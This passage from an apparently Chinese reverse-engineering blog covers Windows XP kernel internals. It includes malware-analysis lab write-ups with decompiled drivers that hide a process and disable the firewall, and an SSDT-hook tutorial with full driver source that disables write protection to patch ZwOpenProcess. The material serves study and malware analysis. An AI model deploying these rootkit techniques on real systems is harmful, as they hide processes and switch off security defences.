Function...\\n&quot;);\t//获取缓冲区数据\tPVOID pSystemBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;\t//获取IO_STACK_LOCATION\tPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);\tULONG InputBufferLength = pStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;\tULONG FsControlCode = pStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;\t//判断操作码\tswitch (FsControlCode)\t&#123;\tcase OPCODE1:\t\tDbgPrint(&quot;不打印操作码&quot;);\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 2;\t\tbreak;\tcase OPCODE2:\t\tDbgPrint(&quot;操作码：%x\\n&quot;, FsControlCode);\t\tfor (UINT32 i = 0; i &lt; InputBufferLength; i++) &#123;\t\t\tDbgPrint(&quot;Ring3 Data: %x\\n&quot;, ((PUCHAR)pSystemBuffer)[i]);\t\t&#125;\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 5;\t\tbreak;\t&#125;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj) &#123;\t//Delete SymbolicLink\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoDeleteSymbolicLink(&amp;SymbolicLinkName);\t//Delete Deivce\tIoDeleteDevice(pDriverObj-&gt;DeviceObject);\tDbgPrint(&quot;Unload Success!\\n&quot;);&#125;\n\n\n\n\n\n\n\n《恶意代码分析实战》——Lab10.3基于Windows XP环境\n使用dd命令查看主函数表的函数：\n1dd 设备地址+主函数偏移 L1C  //winxp中允许0x1C种可能的主函数代码\n\n静态分析-Lab10-03.exe使用ida查看Lab10-03.exe主函数，可以看到主要分为两部分：第一部分由OpenSCManagerA到DeviceIoControl之间的函数调用组成，包含加载和发送请求到内核驱动的函数CreateFileA、DeviceIoControl等；第二部分由其余的函数调用组成，这表明是一个COM对象的使用。\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)&#123;  SC_HANDLE v4; // eax@1  SC_HANDLE v5; // eax@2  void *v6; // esi@2  HANDLE v7; // eax@4  BSTR v9; // esi@8  LPVOID ppv; // [sp+4h] [bp-28h]@7  DWORD BytesReturned; // [sp+8h] [bp-24h]@6  VARIANTARG pvarg; // [sp+Ch] [bp-20h]@8  __int16 v13; // [sp+1Ch] [bp-10h]@8  int v14; // [sp+24h] [bp-8h]@8  v4 = OpenSCManagerA(0, 0, 0xF003Fu);  if ( v4 )  &#123;    v5 = CreateServiceA(           v4,           &quot;Process Helper&quot;,           &quot;Process Helper&quot;,           0xF01FFu,           1u,           3u,           1u,           &quot;C:\\\\Windows\\\\System32\\\\Lab10-03.sys&quot;,           0,           0,           0,           0,           0);    v6 = v5;    if ( v5 )      StartServiceA(v5, 0, 0);    CloseServiceHandle(v6);    v7 = CreateFileA(&quot;\\\\\\\\.\\\\ProcHelper&quot;, 0xC0000000, 0, 0, 2u, 0x80u, 0);    if ( v7 == (HANDLE)-1 )      return 1;    DeviceIoControl(v7, 0xABCDEF01, 0, 0, 0, 0, &amp;BytesReturned, 0);    if ( OleInitialize(0) &gt;= 0 )    &#123;      CoCreateInstance(&amp;rclsid, 0, 4u, &amp;riid, &amp;ppv);      if ( ppv )      &#123;        VariantInit(&amp;pvarg);        v13 = 3;        v14 = 1;        v9 = SysAllocString(L&quot;http://www.malwareanalysisbook.com/ad.html&quot;);        while ( 1 )        &#123;          (*(void (__stdcall **)(LPVOID, BSTR, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + 44))(            ppv,            v9,            &amp;v13,            &amp;pvarg,            &amp;pvarg,            &amp;pvarg);          Sleep(0x7530u);        &#125;      &#125;      OleUninitialize();    &#125;  &#125;  return 0;&#125;\n\n静态分析-Lab10-03.sys在sub_10706函数中，首先调用IoCreateDevice创建了一个名为”\\Device\\ProcHelper”的设备，然后设置设备主函数表DriverObject-&gt;MajorFunction（其中，IRP_MJ_CREATE -&gt; 0，IRP_MJ_CLOSE -&gt; 2，IRP_MJ_DEVICE_CONTROL -&gt; 14（0xE)），随后调用IoCreateSymbolicLink创建一个名为”\\DosDevices\\ProcHelper”的符号链接，来供用户态应用程序访问。\n12345678910111213141516171819202122232425NTSTATUS __stdcall sub_10706(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  NTSTATUS result; // eax@1  NTSTATUS v3; // esi@2  UNICODE_STRING SymbolicLinkName; // [sp+8h] [bp-14h]@2  UNICODE_STRING DestinationString; // [sp+10h] [bp-Ch]@1  PDEVICE_OBJECT DeviceObject; // [sp+18h] [bp-4h]@1  DeviceObject = 0;  RtlInitUnicodeString(&amp;DestinationString, L&quot;\\\\Device\\\\ProcHelper&quot;);  result = IoCreateDevice(DriverObject, 0, &amp;DestinationString, 0x22u, 0x100u, 0, &amp;DeviceObject);  if ( result &gt;= 0 )  &#123;    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)sub_10606;    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)sub_10606;    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)sub_10666;    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_1062A;    RtlInitUnicodeString(&amp;SymbolicLinkName, L&quot;\\\\DosDevices\\\\ProcHelper&quot;);    v3 = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DestinationString);    if ( v3 &lt; 0 )      IoDeleteDevice(DeviceObject);    result = v3;  &#125;  return result;&#125;\n\n对于DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] &#x3D; (PDRIVER_DISPATCH)sub_10666;，这个就是 处理DeviceIoControl请求的驱动代码，查看函数sub_10666，发现其首先调用IoGetCurrentProcess，它返回调用 DeviceIoControl进程的EPROCESS结构，然后访问偏移量0x88处的数据，再访问偏移量0x8C处的数据。在Windows XP中，位于PEB结构偏移量为0x88的是一个LIST_ENTRY结构体，它是包含两个值的双向链表：第一个是BLink，指向列表中的前一项，第二个是FLink，指向列表的下一项。\n本例中，0x88是链表第一个LIST_ENTRY结构体的BLink，0x8C是是链表第一个LIST_ENTRY结构体的FLink。\n此处代码的作用是通过从加载进程的列表中解除链接，来隐藏当前进程。\n12345678910111213141516171819202122232425PAGE:00010666 ; int __stdcall sub_10666(int, PIRP Irp)PAGE:00010666 sub_10666       proc near               ; DATA XREF: sub_10706+54oPAGE:00010666PAGE:00010666 Irp             = dword ptr  0ChPAGE:00010666PAGE:00010666                 mov     edi, ediPAGE:00010668                 push    ebpPAGE:00010669                 mov     ebp, espPAGE:0001066B                 call    ds:IoGetCurrentProcessPAGE:00010671                 mov     ecx, [eax+8Ch]PAGE:00010677                 add     eax, 88hPAGE:0001067C                 mov     edx, [eax]PAGE:0001067E                 mov     [ecx], edxPAGE:00010680                 mov     ecx, [eax]PAGE:00010682                 mov     eax, [eax+4]PAGE:00010685                 mov     [ecx+4], eaxPAGE:00010688                 mov     ecx, [ebp+Irp]  ; IrpPAGE:0001068B                 and     dword ptr [ecx+18h], 0PAGE:0001068F                 and     dword ptr [ecx+1Ch], 0PAGE:00010693                 xor     dl, dl          ; PriorityBoostPAGE:00010695                 call    ds:IofCompleteRequestPAGE:0001069B                 xor     eax, eaxPAGE:0001069D                 pop     ebpPAGE:0001069E                 retn    8PAGE:0001069E sub_10666       endp\n\n\n\n参考链接https://cata1oc.github.io/2020/04/12/3%E7%8E%AF%E4%B8%8E0%E7%8E%AF%E9%80%9A%E4%BF%A1%EF%BC%88%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F%EF%BC%89/\nhttps://cata1oc.github.io/2020/04/14/%E5%88%9D%E6%8E%A2IRP/\n","slug":"IRP Hook","date":"2022-03-27T07:18:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook,IRP","author_index":"0netry"},{"id":"6b2dac661e4ecb3d25144597b91ee96f","title":"SSDT Hook","content":"内核态代码只能被用户态的SYSCALL、SYSENTER或INT 0x2E指令来访问\n程序进入0环后，有一个保存现场的过程，会将3环的各种寄存器都保存到一个叫做_Trap_Frame的结构体中。在3环部分，程序将一个编号存到了eax中，这个编号叫做系统服务号，此外，在保存现场的过程中，程序还让edx指向了3环第一个参数的地址。\n系统服务表在分析代码前，我们先来学习一个结构，系统服务表（System Service Table）\n\n在Windows XP系统下，系统服务表有两张，这两张表存着内核文件的导出函数（不包括内核文件的所有函数，主要是3环函数常用的内核函数）。第一张表导出的内核函数主要来源于ntoskrl.exe，实现大部分3环函数基本功能；第二张表导出的内核函数主要来源于win32k.sys，主要实现图形界面相关功能（例如GDI32.dll的底层实现）。\n系统服务表结构根据示例图，我们先简单认识一下系统服务表，先从结构看起：\n\nServiceTable：指向一个函数地址表，通过系统服务号可以在函数地址表中找到指定的内核函数。\nCount：指当前系统服务表被调用的次数。\nServiceLimit：函数地址表的大小，即系统服务函数的个数\nArgmentTable：系统服务函数参数的大小，以字节为单位，每个成员大小为1个字节。\n\n系统服务表位置这个系统服务表位于KTHREAD结构的0xE0偏移处。这样，在进入0环后我们可以通过fs:[0]找到KPCR结构，然后在KPCR-&gt;0x124找到当前线程的KTHREAD结构，再根据KTHREAD-&gt;0xE0就可以找到当前线程所拥有的系统服务表。（还是要说明一点KTHREAD这个结构体是未文档化的，所以里面的数据随着系统版本的不同各个字段偏移就有可能不同，所以使用前最好用windbg命令dt _KThread 确认下所需要的字段偏移。）\n1fs:[0] -&gt; KPCR -&gt; KPCR+0x124 -&gt; KTHREAD -&gt; KTHREAD+0xE0 -&gt; 系统服务表\n\n系统服务号系统服务号用来定位所要寻找的系统服务表的函数。\n\n系统服务号只有低13位是有用的\n\n下标12：判断去查服务表，0去查第一张表；1去查第二张表\n下标0~11：函数地址表的索引\n\nSSDT前文提到了，我们可以通过fs找到KPCR，在通过KPCR找到KTHREAD，然后在KTHREAD+0xE0处找到系统服务表，这里再介绍另一种找到系统服务表的办法，通过SSDT。\nSSDT&amp;SSDT Shadow在Windows内核中设计了两张系统服务描述符表，一张表是上述所说的SSDT，它只保存非用户界面相关的系统服务（例如创建文件、创建进程等）；另一张表称为ShadowSSDT，它专门用于保存和用户界面相关的服务（例如创建窗口等），这两张表在内核中都使用了同一个结构体的表示：\n12345678//系统服务表typedef struct _KSYSTEM_SERVICE_TABLE&#123;    PULONG ServiceTableBase;       //函数地址表的首地址    PULONG ServiceCounterTableBase;//函数表中每个函数被调用的次数    ULONG  NumberOfService;        //服务函数的个数    ULONG  ParamTableBase;         //参数个数表首地址&#125;KSYSTEM_SERVICE_TABLE;\n\n但实际上系统共有4个系统服务描述符，其中2个就是上述的2张表，另外2个没有被使用，可能是留着将来备用的。他们用如下结构体表示：\n12345678//服务描述符typedef struct _KSERVICE_TABLE_DESCRIPTOR&#123;    KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exe的服务函数,即SSDT    KSYSTEM_SERVICE_TABLE win32k;  //win32k.sys的服务函数,即ShadowSSDT    KSYSTEM_SERVICE_TABLE notUsed1;//暂时没用1    KSYSTEM_SERVICE_TABLE notUsed2;//暂时没用2&#125;KSERVICE_TABLE_DESCRIPTOR;\n\nSSDT（System Services Descriptor Table）系统服务描述符表，在这个结构中包含4个成员，每个成员都是一个系统服务表的结构体，可以在Windbg中通过dd KeServiceDescriptorTable指令进行查看（在程序中可以直接声明全局变量KeServiceDescriptorTable，从而找到系统服务表。）：\n\n我们可以看到第一个成员的ServiceTable，Count，ServiceLimit，ArgmentTable字段，Windows Xp只使用了2张表，所以第三个和第四个成员的位置是空的，此外，由于SSDT第二个成员是未导出的，所以第二个成员的位置也是空的。这里介绍一个新的指令，dd KeServiceDescriptorTableShadow，通过全局变量KeServiceDescriptorTableShadow可以查看两张完整的系统服务表。\n\n但是，全局变量KeServiceDescriptorTableShadow也是未导出的，在实际写程序时，不能通过直接访问win32k.sys导出的第二张系统服务表的函数地址，因为里面的函数地址都是无效的。原因是，win32k.sys导出的第二张系统服务表只有在当前进程访问GDI相关的API时，里面的函数地址表才会挂载到物理页上。如果进程没有用到GDI相关的API，那么第二张系统服务表里面的函数地址表就不会挂载到物理内存，那么里面的函数也无效。\n内核函数查找有了SSDT表，我们查找3环API对应的内核函数就很简单了，拿3环API函数ReadProcessMemory举例，在进入0环之前，给eax赋值了一个系统服务号0xba（Win XP），那我们就用这个ba来查看这个这个函数在内核的实现。\n\n通过这张图，可以很清晰的看出来，ReadProcessMemory所实现的功能，在底层是由一个叫做NtReadVirtualMemory完成的。\n总结API函数的调用过程，从3环进入0环，再到找到对应的内核函数，这部分到这就差不多了，当然，真正的调用过程并没有到此结束，因为调用完0环的函数，总得返回3环呀！只是这部分需要用到APC的知识点，因此这里还不能完整实现。此外，在API函数调用这块，还有个小实验，在SSDT表中追加一个函数地址(NtReadVirtualMemory),自己编写API的3环部分调用这个新增的函数(注意：使用2-9-9-12分页，10-10-12会蓝屏)，就留到后面补上了\n函数服务号查找中的问题及解决方案Windbg——ReadVirtual: not properly sign extended在使用Windbg对windows系统进行内核调试时，查看SSDT表某个函数，如NtQuerySystemInformation的函数地址时，提示如下：\n如：\n123456789100: kd&gt; u 8404a48eReadVirtual: 8404a48e not properly sign extended8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,8\n\n1、这个问题是由于你正在尝试反汇编一个使用 32 位地址的内核代码，但你的 windbg 配置成了对 64 位地址进行解码。在 Windows 的 x64 架构上，所有内核模式的地址都是在高位 32 位的地址空间，也就是说，如果一个内核地址是合法的，它的高位应该是全 1 或全 0。所以当你尝试去反汇编一个低位 32 位地址的代码时，windbg 认为这个地址没有被正确地符号扩展，于是就抛出了这个错误。\n解决这个问题的办法是将 32 位的地址扩展为 64 位的地址。假设你的地址是 0x8404a48e，你可以尝试将其扩展为 0xffffffff8404a48e，然后再使用 u 命令进行反汇编。\n123456789100: kd&gt; u ffffffff8404a48ent!NtQuerySystemInformation:8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,8\n\n2、在WinDbg中打开文件菜单，选择 “Symbol File Path”。加载符号文件：\n在 “Symbol search path” 对话框中，输入以下内容：\n1srv*c:\\symbols*https://msdl.microsoft.com/download/symbols\n\n这将设置 WinDbg 以从 Microsoft 的 symbol 服务器下载 symbol。符号文件将保存在C:\\symbols目录下。\n点击 “OK” 以关闭对话框。\n在WinDbg命令行中，输入以下命令来重新加载symbols：\n1.reload /f\n\n然后你应该可以使用 u 命令来反汇编地址了，例如：\n123456789100: kd&gt; u nt!NTCreateFilent!NtCreateFile:8057d330 8bff            mov     edi,edi8057d332 55              push    ebp8057d333 8bec            mov     ebp,esp8057d335 33c0            xor     eax,eax8057d337 50              push    eax8057d338 50              push    eax8057d339 50              push    eax8057d33a ff7530          push    dword ptr [ebp+30h]\n\n使用WinDbg获取SSDT 系统服务描述表的函数服务号(索引)今天研究了一下午SSDT的东东，最尴尬的是起初我不知道如何获取到SSDT的函数服务号，而这个玩意儿在不同版本的windows是不一样的，后面经过研究还是找到了正确的方法.这里简单的分享一下.\n·  先用个图温习一下Win32API的调用流程吧\n这里以函数QuerySystemInformation为例\n \n·  使用WinDbg获取SSDT函数表对应的索引\n要知道Ntdll.dll中的Win32 API只是一个外壳而已，当从Ring3进入Ring0的时候会将所需要的SSDT索引放入到寄存器EAX中去，所以我们只需要获取到EAX的内容就可以知道函数对应的服务号了.\n好的，我们开始吧，首先打开你的WinDbg，我们以函数QuerySystemInformation为例，我们输入：\n12345678910110: kd&gt; u nt!ZwQuerySystemInformationnt!ZwQuerySystemInformation:83e4b044 b805010000      mov     eax,105h83e4b049 8d542404        lea     edx,[esp+4]83e4b04d 9c              pushfd83e4b04e 6a08            push    883e4b050 e855140000      call    nt!KiSystemService (83e4c4aa)83e4b055 c21000          ret     10hnt!ZwQuerySystemInformationEx:83e4b058 b806010000      mov     eax,106h83e4b05d 8d542404        lea     edx,[esp+4]\n\n看到了吧，mov eax 105h，也就是说我们的服务号是105h.\n但有时候使用u nt!fnction命令查不到，因为0环和三环函数名不一样，如ReadProcessMemory函数三环的函数名未为nt!NtReadVirtualMemory，此时应使用u nt!ZwReadVirtualMemory来查。最完整的方式是通过x32dbg-&gt;符号-&gt;ntdll.dll-&gt;查找function-&gt;双击跳转直到遇到mov easx,num且该命令下面是进入0环的三种方式之一。\n来验证一下，看看是不是函数NtQuerySystemInformation。\n我们先获取到SSDT的地址：\n1234567890: kd&gt; dd KeServiceDescriptorTable83f81b00  83e77e3c 00000000 00000191 83e7848483f81b10  00000000 00000000 00000000 0000000083f81b20  779855dd 779855b4 00000000 005e6c0783f81b30  841e45b8 8414d4f4 83eed107 0000000083f81b40  83e77e3c 00000000 00000191 83e7848483f81b50  95266000 00000000 00000339 9526702c83f81b60  011b4415 0000005d 00000011 0000010083f81b70  5385d2ba d717548f 00000000 00000000\n\n可以看到SSDT的地址是 83e77e3c\n然后通过服务号计算一下SSDT表中这个服务的位置。\nAddress &#x3D; SSDT+4*服务号\n我们得到结果为:0x83e77e3c + 4*0x105 &#x3D; 0x83EC11B0\n可以使用如下命令查看函数地址\n1234567890: kd&gt; dd 83e77e3c+105*483e78250  8404a48e 84083631 84091f0a 8412986283e78260  84006048 84064f79 840767bd 8407103a83e78270  840156b2 8401186c 83e53ccc 83ff067e83e78280  8407cd82 83fb0904 841109ea 840e5cd583e78290  8407a922 8410ffb2 83fc0b43 83fc23df83e782a0  841123ba 840fa3e2 8404a8a7 84042db983e782b0  8402ce29 83e8ce1c 8401f579 8401a4cf83e782c0  840c9289 840b72ac 84112056 840b6dfe\n\n我们得到函数的地址是 8404a48e\n在使用u命令:\n123456789101112131415161718190: kd&gt; u 8404a48e    8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,80: kd&gt; u ffffffff8404a48e  //如果直接使用地址不显示，则在地址前面加8个fnt!NtQuerySystemInformation:8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,8\n\n看到了吧，我们成功的找到了函数NtQuerySystemInformation的地址.也就是说我们的服务号是正确的.\nSSDT hook使用PsGetCurrentThread()函数可获取当前KTHREAD的首地址。但是需要注意的是SSDT表所在的内存页属性是只读，没有写入的权限，所以需要把该地址设置为可写入，这样才能写入自己的函数。我使用的是CR0寄存器关闭只读属性简单介绍下CR0寄存器:可以看到这里使用32位寄存器，而在CR0寄存器中，我们重点关注的是3个标志位：PE ­ 是否启用保护模式,置1则启用。PG ­ 是否使用分页模式, 置1则开启分页模式, 此标志置1时, PE 标志也必须置1,否则CPU报异常。WP ­ WP为1 时, 不能修改只读的内存页 , WP为0 时, 可以修改只读的内存页。\n所以在进行HOOK时，只要把CR0寄存器中的WP位置为0，就能对内存进行写入操作。操作代码如下\n12345678910//关闭页只读保护__asm    &#123;        push eax;        mov eax, cr0;        and eax, ~0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;\n\n当然使用完成后要把只读保护属性还回去，不然会引发不可预料的严重后果\n12345678910//开启页只读保护__asm    &#123;        push eax;        mov eax, cr0;        or eax, 0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;\n\n有了以上分析的基础那么现在就可以写安装内核钩子的代码了：\n12345678910111213141516171819//安装钩子void InstallHook()&#123;    //1.获取KTHREAD    PETHREAD pNowThread = PsGetCurrentThread();    //2.获取ServiceTable表，该字段偏移为0xbc    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)        (*(ULONG*)((ULONG)pNowThread + 0xbc));    //3.保存hook的旧的函数的地址，0xbe为ZwOpenProcess的调用号    g_OldZwOpenProcess = (FuZwOpenProcess)        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe];    //4.关闭页只读保护    ShutPageProtect();    //5.写入自己的函数到SSDT表内    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe]        = (ULONG)MyZwOpenProcess;    //6.开启页只读保护    OpenPageProtect();&#125;\n\n看一下自己写的MyZwOpenProcess函数，通过对比PID找到要保护的进程，并且是以结束进程权限PROCESS_TERMINATE（0x1）访问时，则修改权限为0使其无法访问。就达到了保护进程的目的。\n12345678910111213141516171819202122//自写的函数NTSTATUS NTAPI MyZwOpenProcess(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId)&#123;    //当此进程为要保护的进程时，并且是以结束进程权限访问时    if (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;        DesiredAccess == PROCESS_TERMINATE)    &#123;        //设为拒绝访问        DesiredAccess = 0;    &#125;    //调用原函数    return g_OldZwOpenProcess(        ProcessHandle,        DesiredAccess,        ObjectAttributes,        ClientId);&#125;\n\n完整源码如下\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#include &lt;ntifs.h&gt; //内核之SSDT-HOOK//系统服务表typedef struct _KSYSTEM_SERVICE_TABLE&#123;    PULONG ServiceTableBase;       //函数地址表的首地址    PULONG ServiceCounterTableBase;//函数表中每个函数被调用的次数    ULONG  NumberOfService;        //服务函数的个数    ULONG ParamTableBase;          //参数个数表首地址&#125;KSYSTEM_SERVICE_TABLE; //服务描述符typedef struct _KSERVICE_TABLE_DESCRIPTOR&#123;    KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exe的服务函数,SSDT    KSYSTEM_SERVICE_TABLE win32k;  //win32k.sys的服务函数,ShadowSSDT    KSYSTEM_SERVICE_TABLE notUsed1;//暂时没用1    KSYSTEM_SERVICE_TABLE notUsed2;//暂时没用2&#125;KSERVICE_TABLE_DESCRIPTOR; //定义HOOK的函数的类型typedef NTSTATUS (NTAPI*FuZwOpenProcess)(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId); //自写的函数声明NTSTATUS NTAPI MyZwOpenProcess(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId); //记录系统的该函数FuZwOpenProcess g_OldZwOpenProcess;//服务描述符表指针KSERVICE_TABLE_DESCRIPTOR* g_pServiceTable = NULL;//要保护进程的IDULONG g_Pid = 9527; //安装钩子void InstallHook();//卸载钩子void UninstallHook();//关闭页写入保护void ShutPageProtect();//开启页写入保护void OpenPageProtect(); //卸载驱动void OutLoad(DRIVER_OBJECT* obj);   ////***驱动入口主函数***/NTSTATUS DriverEntry(DRIVER_OBJECT* driver, UNICODE_STRING* path)&#123;    path;    KdPrint((&quot;驱动启动成功！\\n&quot;));    //DbgBreakPoint();     //安装钩子    InstallHook();     driver-&gt;DriverUnload = OutLoad;    return STATUS_SUCCESS;&#125; //卸载驱动void OutLoad(DRIVER_OBJECT* obj)&#123;    obj;    //卸载钩子    UninstallHook();&#125; //安装钩子void InstallHook()&#123;    //1.获取KTHREAD    PETHREAD pNowThread = PsGetCurrentThread();    //2.获取ServiceTable表    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)        (*(ULONG*)((ULONG)pNowThread + 0xbc));    //3.保存旧的函数    g_OldZwOpenProcess = (FuZwOpenProcess)        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe];    //4.关闭页只读保护    ShutPageProtect();    //5.写入自己的函数到SSDT表内    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe]        = (ULONG)MyZwOpenProcess;    //6.开启页只读保护    OpenPageProtect();&#125; //卸载钩子void UninstallHook()&#123;    //1.关闭页只读保护    ShutPageProtect();    //2.写入原来的函数到SSDT表内    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe]        = (ULONG)g_OldZwOpenProcess;    //3.开启页只读保护    OpenPageProtect();&#125; //关闭页只读保护void _declspec(naked) ShutPageProtect()&#123;    __asm    &#123;        push eax;        mov eax, cr0;        and eax, ~0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;&#125; //开启页只读保护void _declspec(naked) OpenPageProtect()&#123;    __asm    &#123;        push eax;        mov eax, cr0;        or eax, 0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;&#125; //自写的函数NTSTATUS NTAPI MyZwOpenProcess(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId)&#123;    //当此进程为要保护的进程时    if (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;        DesiredAccess == PROCESS_TERMINATE)    &#123;        //设为拒绝访问        DesiredAccess = 0;    &#125;    //调用原函数    return g_OldZwOpenProcess(        ProcessHandle,        DesiredAccess,        ObjectAttributes,        ClientId);&#125;\n\n《恶意代码分析实战》——Lab10.1静态分析-Lab10-01.exe用IDA查看该程序主函数，发现其主要是调用OpenSCManagerA获取服务管理器句柄，然后调用CreateServiceA，创建一个名为Lab10-01的服务。CreateServiceA调用告诉我们服务使用了”C:\\Windows\\System32\\Lab10-01.sys”中的代码，服务类型为3（SERVICE_KERNEL_DRIVER），这意味着这个文件将被加载到内核。\n如果CreateServiceA调用失败，代码会使用相同的服务名”Lab10-01”调用OpenServiceA，即表示如果因为服务已经存在而导致调用CreateServiceA失败，则打开”Lab10-01”服务的句柄。\n接下来调用StartServiceA来启动服务。\n最后调用ControlService。ControlService的第二个参数是发送控制消息的类型。本例中它的值是SERVICE_CONTROL_STOP（1），这将会卸载驱动，并调用驱动的卸载函数。\n1234567891011121314151617181920212223242526272829303132333435int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)&#123;  int result; // eax@1  void *v5; // edi@1  SC_HANDLE v6; // esi@2  struct _SERVICE_STATUS ServiceStatus; // [sp+4h] [bp-1Ch]@5  result = (int)OpenSCManagerA(0, 0, 0xF003Fu);  v5 = (void *)result;  if ( result )  &#123;    v6 = CreateServiceA(           (SC_HANDLE)result,           &quot;Lab10-01&quot;,           &quot;Lab10-01&quot;,           0xF01FFu,           1u,           3u,           1u,           &quot;C:\\\\Windows\\\\System32\\\\Lab10-01.sys&quot;,           0,           0,           0,           0,           0);    if ( v6 || (v6 = OpenServiceA(v5, &quot;Lab10-01&quot;, 0xF01FFu)) != 0 )    &#123;      StartServiceA(v6, 0, 0);      if ( v6 )        ControlService(v6, SERVICE_CONTROL_STOP, &amp;ServiceStatus);    &#125;    result = 0;  &#125;  return result;&#125;\n\n静态分析-Lab10-01.sys使用IDA分析驱动，可以看到sub_10906函数中将sub_10486函数地址赋值给了DriverObject-&gt;DriverUnload。\n而sub_10486函数中，则调用三次 RtlCreateRegistryKey函数创建了一些注册表键，然后调用两次RtlWriteRegistryValue函数，在两个地方设置EnableFirewall值为0。从内核禁用防火墙的这种方法难以被安全程序探测到。\n其中，当从内核态访问注册表时，前缀\\Registry\\Machine等同于用户态程序访问的HKEY_LOCAL_MACHINE。\n123456789101112131415161718192021222324252627282930313233343536NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  sub_10920();  return sub_10906(DriverObject, RegistryPath);&#125;NTSTATUS __stdcall sub_10906(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_10486;  return 0;&#125;NTSTATUS __stdcall sub_10486(int a1)&#123;  int ValueData; // [sp+Ch] [bp-4h]@1  ValueData = 0;  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft&quot;);  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall&quot;);  